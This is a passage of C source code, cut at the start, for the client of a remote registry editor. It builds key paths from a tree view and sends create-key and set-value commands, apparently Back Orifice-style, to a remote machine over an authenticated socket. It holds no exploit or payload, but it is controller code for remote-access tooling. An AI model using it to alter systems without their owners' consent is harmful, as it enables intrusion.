			char *pNewKeyPath=(char *)malloc(lstrlen(svKey)+2+lstrlen(pKeyPath));
			lstrcpy(pNewKeyPath,svKey);
			lstrcat(pNewKeyPath,"\\");
			lstrcat(pNewKeyPath,pKeyPath);
			free(pKeyPath);
			pKeyPath=pNewKeyPath;
		}
		
		htic=TreeView_GetParent(htv,htic);
	}
	if(pKeyPath==NULL) return FALSE;

	// Add the new key name to the path
	char *pNewKeyPath=(char *)malloc(lstrlen(pKeyPath)+lstrlen(svKeyName)+1);
	lstrcpy(pNewKeyPath,pKeyPath);
	lstrcat(pNewKeyPath,svKeyName);
	free(pKeyPath);
	pKeyPath=pNewKeyPath;

	// Now request the creation
	IssueAuthCommandRequest(pSock,BO_REGISTRYCREATEKEY,GetTickCount(),0,pKeyPath,NULL);
	
	// Get "Created "
	while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
	if(nRet==-1) { 
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return FALSE; 
	}
	BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
	if(strncmp(svArg2,"Could not",9)==0) {
		MessageBox(NULL,svArg2,"Registry Error",MB_OK|MB_ICONINFORMATION|MB_SETFOREGROUND|MB_TOPMOST);
		pSock->Free(data);
		free(pKeyPath);
		return FALSE;
	}
	if(strncmp(svArg2,"Created ",8)!=0) { 
		pSock->Free(data);
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return FALSE;
	}
	pSock->Free(data);	
	free(pKeyPath);

	return TRUE;
}

BOOL CreateNewValue(REGEDIT_CONTEXT *recontext, HWND htv, HTREEITEM hti, DWORD dwType, char *svName)
{
	int nRet,len;
	BYTE *data;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;
	CAuthSocket *pSock=recontext->pSock;
	
	// Check to see if it's the root key
	if(hti==recontext->root) 
		return FALSE;
	
	// Build the key path
	char *pKeyPath=NULL;
	HTREEITEM htic=hti;
	char svKey[260];
	while(htic!=recontext->root) {
		// Get the key we're opening
		TVITEM tvi;
		tvi.mask=TVIF_TEXT;
		tvi.hItem=htic;
		tvi.pszText=svKey;
		tvi.cchTextMax=260;
		TreeView_GetItem(htv,&tvi);
		
		// Add to key path
		if(pKeyPath==NULL) {
			pKeyPath=(char *)malloc(lstrlen(svKey)+2);
			lstrcpy(pKeyPath,svKey);
			lstrcat(pKeyPath,"\\");
		} else {
			char *pNewKeyPath=(char *)malloc(lstrlen(svKey)+2+lstrlen(pKeyPath));
			lstrcpy(pNewKeyPath,svKey);
			lstrcat(pNewKeyPath,"\\");
			lstrcat(pNewKeyPath,pKeyPath);
			free(pKeyPath);
			pKeyPath=pNewKeyPath;
		}
		
		htic=TreeView_GetParent(htv,htic);
	}
	if(pKeyPath==NULL) return FALSE;

	// Value setting parameter string
	char svParam[1024];
	if(dwType==REG_SZ) {
		wsprintf(svParam,"S:(%.512s):",svName);
	} else if(dwType==REG_DWORD) {
		wsprintf(svParam,"D:(%.512s):",svName);
	} else {
		wsprintf(svParam,"B:(%.512s):",svName);
	}

	// Now request the creation
	IssueAuthCommandRequest(pSock,BO_REGISTRYSETVALUE,GetTickCount(),0,pKeyPath,svParam);
	
	// Get "Value "
	while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
	if(nRet==-1) { 
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return FALSE; 
	}
	BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
	if(strncmp(svArg2,"Could not",9)==0) {
		MessageBox(NULL,svArg2,"Registry Error",MB_OK|MB_ICONINFORMATION|MB_SETFOREGROUND|MB_TOPMOST);
		pSock->Free(data);
		free(pKeyPath);
		return FALSE;
	}
	if(strncmp(svArg2,"Value ",6)!=0) { 
		pSock->Free(data);
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return FALSE;
	}
	pSock->Free(data);	
	free(pKeyPath);
	return TRUE;
}

BOOL ModifyValue(REGEDIT_CONTEXT *recontext, HWND htv, HTREEITEM hti, DWORD dwType, char *svName, void *pNewData, DWORD dwNewDataLen)
{
	int nRet,len;
	BYTE *data;
	int cmdlen,command,comid,nArg1;
	char *svArg2,*svArg3;
	CAuthSocket *pSock=recontext->pSock;
	
	// Check to see if it's the root key
	if(hti==recontext->root) 
		return FALSE;
	
	// Build the key path
	char *pKeyPath=NULL;
	HTREEITEM htic=hti;
	char svKey[260];
	while(htic!=recontext->root) {
		// Get the key we're opening
		TVITEM tvi;
		tvi.mask=TVIF_TEXT;
		tvi.hItem=htic;
		tvi.pszText=svKey;
		tvi.cchTextMax=260;
		TreeView_GetItem(htv,&tvi);
		
		// Add to key path
		if(pKeyPath==NULL) {
			pKeyPath=(char *)malloc(lstrlen(svKey)+2);
			lstrcpy(pKeyPath,svKey);
			lstrcat(pKeyPath,"\\");
		} else {
			char *pNewKeyPath=(char *)malloc(lstrlen(svKey)+2+lstrlen(pKeyPath));
			lstrcpy(pNewKeyPath,svKey);
			lstrcat(pNewKeyPath,"\\");
			lstrcat(pNewKeyPath,pKeyPath);
			free(pKeyPath);
			pKeyPath=pNewKeyPath;
		}
		
		htic=TreeView_GetParent(htv,htic);
	}
	if(pKeyPath==NULL) return FALSE;

	// Value setting parameter string
	char *svParam=(char *)malloc(lstrlen(svName)+5+dwNewDataLen*3+1);
	if(dwType==REG_MULTI_SZ) {
		wsprintf(svParam,"M:(%s):",svName);
		memcpy(svParam+lstrlen(svParam),pNewData,dwNewDataLen);
	} else if(dwType==REG_EXPAND_SZ) {
		wsprintf(svParam,"E:(%s):%s",svName,pNewData);
	} else if(dwType==REG_SZ) {
		wsprintf(svParam,"S:(%s):%s",svName,pNewData);
	} else if(dwType==REG_DWORD) {
		wsprintf(svParam,"D:(%.512s):%u",svName,*(DWORD *)pNewData);
	} else {
		wsprintf(svParam,"B:(%.512s):",svName);
		DWORD dw;
		BYTE b;
		char chr[4];
		for(dw=0;dw<dwNewDataLen;dw++) {
			b=*(((BYTE *)pNewData)+dw);
			if(dw<(dwNewDataLen-1))
				wsprintf(chr,"%2.2X ",b);
			else {
				wsprintf(chr,"%2.2X",b);
			}
			lstrcat(svParam,chr);
		}
	}

	// Now request the creation
	IssueAuthCommandRequest(pSock,BO_REGISTRYSETVALUE,GetTickCount(),0,pKeyPath,svParam);
	
	// Get "Value "
	while((nRet=pSock->Recv(&data,&len))<=0) Sleep(20);
	if(nRet==-1) { 
		free(pKeyPath);
		RegeditDisconnect(recontext); 
		return FALSE; 
	}
	BreakDownCommand(data,&cmdlen,&command,&comid,&nArg1,&svArg2,&svArg3);
	if(strncmp(svArg2,"Could not",9)==0) {
		MessageBox(NULL,svArg2,"Registry Error",MB_OK|MB_ICONINFORMATION|MB_SETFOREGROUND|MB_TOPMOST);
		pSock->Free(data);
		free(pKeyPath);
		return FALSE;
	}
	if(strncmp(svArg2,"Value ",6)!=0) { 
		pSock->Free(data);
		RegeditDisconnect(recontext); 
		free(pKeyPath);
		return FALSE;
	}
	free(pKeyPath);
	pSock->Free(data);	

	return TRUE;
}

void CopyKeyName(REGEDIT_CONTEXT *recontext,HWND htv,HTREEITEM hti)
{	
	// Build the key path
	char *pKeyPath=NULL;
	HTREEITEM htic=hti;
	char svKey[260];
	while(htic!=recontext->root) {
		// Get the key we're opening
		TVITEM tvi;
		tvi.mask=TVIF_TEXT;
		tvi.hItem=htic;
		tvi.pszText=svKey;
		tvi.cchTextMax=260;
		TreeView_GetItem(htv,&tvi);
		
		// Add to key path
		if(pKeyPath==NULL) {
			pKeyPath=(char *)malloc(lstrlen(svKey)+2);
			lstrcpy(pKeyPath,svKey);
			lstrcat(pKeyPath,"\\");
		} else {
			char *pNewKeyPath=(char *)malloc(lstrlen(svKey)+2+lstrlen(pKeyPath));
			lstrcpy(pNewKeyPath,svKey);
			lstrcat(pNewKeyPath,"\\");
			lstrcat(pNewKeyPath,pKeyPath);
			free(pKeyPath);
			pKeyPath=pNewKeyPath;
		}
		
		htic=TreeView_GetParent(htv,htic);
	}
	if(pKeyPath==NULL) return;

	HANDLE hmem=GlobalAlloc(GMEM_MOVEABLE,lstrlen(pKeyPath)+1);
	LPVOID pmem=GlobalLock(hmem);
	memcpy(pmem,pKeyPath,lstrlen(pKeyPath)+1);
	GlobalUnlock(hmem);
	free(pKeyPath);
	
	OpenClipboard(NULL);
	EmptyClipboard();
	SetClipboardData(CF_TEXT,hmem);
	CloseClipboard();

}
